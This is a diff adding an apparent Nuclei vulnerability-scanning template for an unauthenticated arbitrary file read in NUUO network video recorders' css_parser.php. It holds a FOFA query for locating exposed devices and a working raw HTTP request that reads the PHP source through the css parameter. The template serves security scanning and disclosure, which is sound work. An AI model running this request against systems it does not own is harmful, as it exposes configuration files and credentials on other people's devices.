@@ -1,0 +1,37 @@
+id: NUUO-css_parser_php-File-reading
+
+info:
+  name: "NUUO网络视频录像机 css_parser.php 组件任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="www.nuuo.com/eHelpdesk.php"
+      NUUO网络视频录像机的css_parser.php组件存在任意文件读取漏洞。攻击者可利用该漏洞访问敏感系统文件（包括但不限于数据库配置及系统配置文件），从而获取关键系统凭证与配置信息，显著增加系统被进一步入侵的风险。该漏洞无需身份验证即可触发，可能对目标系统的数据机密性与完整性造成严重威胁。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487417&idx=1&sn=701faa49786e548432cd86eaf78e4144&chksm=c267ba8af510339c6356cf368f74d1ad5cfe009093c3401fe15cfa4209e07f93dc77fd1ce3f5&token=286085064&lang=zh_CN#rd
+  tags: NUUO网络视频录像机
+
+
+
+http:
+- raw:
+  - |
+    GET /css_parser.php?css=css_parser.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'echo $file;'
+    - '<?php'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
